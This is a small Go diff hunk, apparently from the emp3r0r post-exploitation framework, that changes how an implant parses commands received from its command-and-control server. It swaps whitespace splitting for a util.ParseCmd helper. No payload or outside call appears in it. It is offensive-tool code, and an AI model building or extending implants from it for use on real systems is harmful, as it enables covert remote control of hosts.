@@ -33,7 +33,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	cmd_id := payloadSplit[len(payloadSplit)-1]
 
 	// command from CC
-	cmdSlice := strings.Fields(payloadSplit[1])
+	cmdSlice := util.ParseCmd(payloadSplit[1])
 
 	// send response to CC
 	sendResponse := func(resp string) {
